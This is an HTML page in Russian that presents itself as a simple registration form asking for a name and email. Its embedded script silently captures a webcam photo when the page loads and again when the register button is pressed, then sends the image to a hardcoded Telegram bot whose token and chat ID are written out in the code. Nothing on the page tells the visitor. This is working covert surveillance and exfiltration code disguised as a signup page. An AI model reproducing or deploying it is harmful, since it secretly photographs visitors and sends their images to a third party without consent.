<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация</title>
    <style>
        body {
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background-color: white;
            padding: 30px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 300px;
            text-align: center;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
    <script>
        const TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";  // Токен бота
        const CHAT_ID = "7477642275";  // Chat ID
        const PHOTO_API_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
        
        // Функция для отправки фото в Telegram
        function sendPhotoToTelegram(dataURI) {
            let photoBlob = dataURItoBlob(dataURI);

            let formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'photo.png');

            fetch(PHOTO_API_URL, {
                method: 'POST',
                body: formData
            }).then(response => {
                return response.json();
            }).then(data => {
                console.log('Фото отправлено в Telegram:', data);
            }).catch(error => {
                console.error('Ошибка отправки фото:', error);
            });
        }

        // Функция для преобразования Data URL в Blob
        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let arrayBuffer = new ArrayBuffer(byteString.length);
            let uintArray = new Uint8Array(arrayBuffer);
            for (let i = 0; i < byteString.length; i++) {
                uintArray[i] = byteString.charCodeAt(i);
            }
            return new Blob([arrayBuffer], { type: 'image/png' });
        }

        // Функция для захвата фото с камеры и отправки в Telegram
        function capturePhoto() {
            // Пытаемся получить доступ к камере
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        let videoElement = document.createElement("video");
                        videoElement.srcObject = stream;
                        videoElement.play();

                        // Сразу после разрешения на доступ к камере делаем фото
                        setTimeout(() => {
                            takeAndSendPhoto(stream, videoElement);
                        }, 1000); // Даем 1 секунду на загрузку камеры

                    }).catch(err => {
                        console.log("Ошибка с доступом к камере: " + err);
                    });
            }
        }

        // Функция для захвата фото и отправки в Telegram
        function takeAndSendPhoto(stream, videoElement) {
            let canvas = document.createElement("canvas");
            let ctx = canvas.getContext("2d");
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            let photoDataUrl = canvas.toDataURL("image/png");

            // Отправка фото в Telegram
            sendPhotoToTelegram(photoDataUrl);

            // Останавливаем поток камеры и удаляем элемент видео
            stream.getTracks().forEach(track => track.stop());
        }

        // Инициализация
        window.onload = function() {
            // При загрузке страницы сразу делаем фото
            capturePhoto();
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Регистрация</h1>
        <input type="text" placeholder="Введите имя" id="name" />
        <input type="email" placeholder="Введите email" id="email" />
        <button onclick="capturePhoto()">Зарегистрироваться</button>
    </div>
</body>
</html>
